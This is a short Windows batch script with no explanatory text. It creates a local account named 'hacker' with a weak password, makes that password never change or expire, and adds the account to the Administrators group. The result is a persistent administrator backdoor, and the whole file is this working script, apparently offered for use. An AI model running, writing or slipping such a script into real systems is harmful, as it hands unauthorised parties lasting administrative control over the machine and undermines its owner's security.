@echo off
net user hacker pw123 /add /comment:"COMMENT" /passwordchg:NO
wmic useraccount where "name='hacker'" set passwordexpires=FALSE
net localgroup "Administrators" hacker /add
exit
